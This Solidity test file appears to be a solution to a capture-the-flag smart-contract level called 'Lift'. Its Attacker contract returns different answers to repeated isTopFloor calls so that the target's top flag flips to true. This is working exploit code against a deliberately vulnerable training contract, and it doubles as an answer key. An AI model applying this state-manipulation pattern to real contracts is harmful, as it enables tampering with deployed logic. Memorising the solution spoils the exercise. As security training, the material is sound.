// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(address(instance));

        attacker.attack();

        checkSuccess();
    }


    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Attacker is House {
    Lift public liftInstance;
    bool public firstCall = true;

    constructor(address _liftAddress) {
        liftInstance = Lift(_liftAddress);
    }

    function attack() public {
        liftInstance.goToFloor(5);
    }

    function isTopFloor(uint256) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}